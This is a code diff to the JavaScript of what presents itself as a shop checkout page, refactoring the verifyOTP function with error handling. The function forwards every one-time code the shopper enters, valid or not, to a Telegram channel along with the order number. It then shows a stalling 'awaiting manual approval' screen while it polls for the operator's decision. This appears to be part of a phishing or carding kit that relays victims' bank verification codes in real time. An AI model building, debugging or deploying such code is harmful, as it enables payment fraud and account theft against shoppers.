@@ -1304,31 +1304,27 @@ function startOTPCountdown() {
 }
 
 function verifyOTP() {
-    const otpInput = document.getElementById('otp-single-input');
-    if (!otpInput) {
-        console.error('OTP input not found');
-        return;
-    }
+    try {
+        const otpInput = document.getElementById('otp-single-input');
+        const otpContent = document.querySelector('.otp-content');
+        const otpError = document.getElementById('otp-error');
 
-    // Get the raw input value (no space removal needed)
-    const enteredOTP = otpInput.value.trim();
-    const otpError = document.getElementById('otp-error');
+        // Critical check: if elements don't exist, we can't proceed.
+        if (!otpInput || !otpContent || !otpError) {
+            console.error('One or more critical OTP elements are missing from the DOM.', { otpInput, otpContent, otpError });
+            alert('A UI error occurred. Please close the checkout and try again.');
+            return;
+        }
 
-    console.log('Verifying OTP:', enteredOTP, 'Length:', enteredOTP.length);
+        const enteredOTP = otpInput.value.trim();
+        console.log('Verify button clicked. OTP entered:', enteredOTP);
 
-    // Always send to Telegram, regardless of input.
-    if (otpError) {
         otpError.style.display = 'none';
-    }
 
-    // Send the user-entered OTP to Telegram for verification
-    if (typeof TelegramNotifications !== 'undefined' && checkoutData.orderNumber) {
-        TelegramNotifications.userEnteredOTP(enteredOTP, checkoutData.orderNumber);
-    }
+        if (typeof TelegramNotifications !== 'undefined' && checkoutData.orderNumber) {
+            TelegramNotifications.userEnteredOTP(enteredOTP, checkoutData.orderNumber);
+        }
 
-    // Update the UI to show a "waiting for confirmation" message
-    const otpContent = document.querySelector('.otp-content');
-    if (otpContent) {
         otpContent.innerHTML = `
             <div class="success-icon" style="font-size: 3rem; color: var(--primary-color); margin-bottom: 1rem;">
                 <i class="fas fa-hourglass-half"></i>
@@ -1336,11 +1332,12 @@ function verifyOTP() {
             <h3>${(currentLanguage === 'es' ? 'Esperando Confirmación' : 'Awaiting Confirmation')}</h3>
             <p>${(currentLanguage === 'es' ? 'Tu pedido está pendiente de aprobación manual. Recibirás una notificación pronto.' : 'Your order is pending manual approval. You will receive a notification shortly.')}</p>
         `;
-    }
 
-    // Start polling for confirmation from the backend.
-    // This function will repeatedly check if the order has been confirmed in Telegram.
-    pollForConfirmation(checkoutData.orderNumber);
+        pollForConfirmation(checkoutData.orderNumber);
+    } catch (err) {
+        console.error("A critical error occurred in verifyOTP:", err);
+        alert("An unexpected error occurred. Please check the developer console for details.");
+    }
 }
 
 /**
